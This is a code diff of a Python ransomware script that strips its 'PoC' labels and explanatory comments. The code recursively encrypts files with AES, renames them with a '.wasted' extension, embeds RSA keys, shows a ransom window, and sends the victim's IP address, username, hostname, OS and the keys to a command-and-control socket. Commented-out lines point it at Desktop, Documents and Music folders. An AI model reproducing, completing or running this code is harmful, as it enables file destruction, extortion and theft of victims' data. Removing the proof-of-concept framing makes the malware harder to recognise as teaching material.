@@ -54,12 +54,11 @@ fTP4iR+dcCRjINej2DVzfm4QsWN/DUuoNdKZm5sSb7DNyJQnz94SM/r5uxTZ+72U
 MQz5AoGBAK/R9Fx7UBmHcC+9ehBJ5aPzvU8DqiVYg2wAYGu/n81s30VdtTQwfSed
 14roox6zaAk8fEZ/nkS86evh6PqjfhSuniBoqvQllAPZTXdOm8KPchNU8VC+iSzw
 +IbSWacaVjzrtfY/UcRkUrgQotk8a4kPZrijPogn060VnXPEeq3t
------END RSA PRIVATE KEY-----''' # SHOULD NOT BE INCLUDED - only for decryptor purposes
-extension = ".wasted" # Ransomware custom extension
+-----END RSA PRIVATE KEY-----'''
+extension = ".wasted" 
 
-# Exfilitrate key to C2
-host = '127.0.0.1' # e.g. maliciousc2.com
-port = 443 # e.g. 443
+host = '127.0.0.1'
+port = 443 
 
 def getlocalip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -67,36 +66,37 @@ def getlocalip():
     return s.getsockname()[0]
 
 def parse_args():
-    parser = argparse.ArgumentParser(description='Ransomware PoC')
+    parser = argparse.ArgumentParser(description='Ransomware')
     parser.add_argument('-p', '--path', help='Absolute path to start encryption. If none specified, defaults to %%HOME%%/test_ransomware', action="store")
 
     group = parser.add_mutually_exclusive_group(required=True)
-    group.add_argument('-e', '--encrypt', help='Enable encryption of files',
+    group.add_argument('-e', '--encrypt', help='Encrypt files',
                         action='store_true')
-    group.add_argument('-d', '--decrypt', help='Enable decryption of encrypted files',
+    group.add_argument('-d', '--decrypt', help='Decrypt files',
                         action='store_true')
                         
     return parser.parse_args()
 
 def main():
     if len(sys.argv) <= 1:
-        print('[*] Ransomware - PoC\n')
-        # banner()        
+        print('[*] Ransomware\n')      
         print('Usage: python3 main_v2.py -h')
         print('{} -h for help.'.format(sys.argv[0]))
         exit(0)
 
-    # Parse arguments
     args = parse_args()
     encrypt = args.encrypt
     decrypt = args.decrypt
     
     absolute_path = str(args.path)
     
-    # Force one click and comment out args above
     # absolute_path = "None"
     # encrypt = True 
     # decrypt = False
+    # I changed here. 
+    # absolute_path = "None"
+    # encrypt = True 
+    # decrypt = True
     
     if absolute_path != 'None':
         startdirs = [absolute_path]
@@ -107,7 +107,6 @@ def main():
             startdirs = [os.environ['HOME'] + '/test_ransomware']
         elif plt == "Windows":
             startdirs = [os.environ['USERPROFILE'] + '\\test_ransomware']
-            # Can also hardcode additional directories
             # startdirs = [os.environ['USERPROFILE'] + '\\Desktop', 
                         # os.environ['USERPROFILE'] + '\\Documents',
                         # os.environ['USERPROFILE'] + '\\Music',
@@ -117,7 +116,6 @@ def main():
             print("Unidentified system")
             exit(0)
    
-    # Encrypt AES key with attacker's embedded RSA public key 
     server_key = RSA.importKey(SERVER_PUBLIC_RSA_KEY)
     encryptor = PKCS1_OAEP.new(server_key)
     encrypted_key = encryptor.encrypt(HARDCODED_KEY)
@@ -128,16 +126,13 @@ def main():
     if encrypt:
         key = HARDCODED_KEY    
     if decrypt:
-        # RSA Decryption function - warning that private key is hardcoded for testing purposes
         rsa_key = RSA.importKey(SERVER_PRIVATE_RSA_KEY)
         decryptor = PKCS1_OAEP.new(rsa_key)
         key = decryptor.decrypt(base64.b64decode(encrypted_key_b64))
 
-    # Create AES counter and AES cipher
     ctr = Counter.new(128)
     crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
     
-    # Recursively go through folders and encrypt/decrypt files
     for currentDir in startdirs:
         for file in discover.discoverFiles(currentDir):
             if encrypt and not file.endswith(extension):
@@ -151,23 +146,18 @@ def main():
                 print("File changed from " + file + " to " + file_original)
             
     if encrypt: 
-        # Exfiltrate encrypted key to C2
         def connector():
             server = socket.socket(socket.AF_INET)
             server.settimeout(10)
             try:
-                # Send Key
                 server.connect((host, port))
                 msg = '%s$%s$%s$%s$%s$%s' % (
                     getlocalip(), platform.system(), SERVER_PRIVATE_RSA_KEY, SERVER_PUBLIC_RSA_KEY, getpass.getuser(), platform.node())
                 server.send(msg.encode('utf-8'))
 
-                # if plt == "Windows"
                 main = mainwindow(encrypted_key_b64)
                 main.mainloop()
             except Exception as e:
-                # if plt == "Windows"
-                # Do not send key, encrypt anyway.
                 main = mainwindow(encrypted_key_b64)
                 main.mainloop()
                 pass
@@ -176,8 +166,6 @@ def main():
         except KeyboardInterrupt:
             sys.exit(0)
 
-    # This wipes the key out of memory
-    # to avoid recovery by third party tools
     for _ in range(100):
         #key = random(32)
         pass
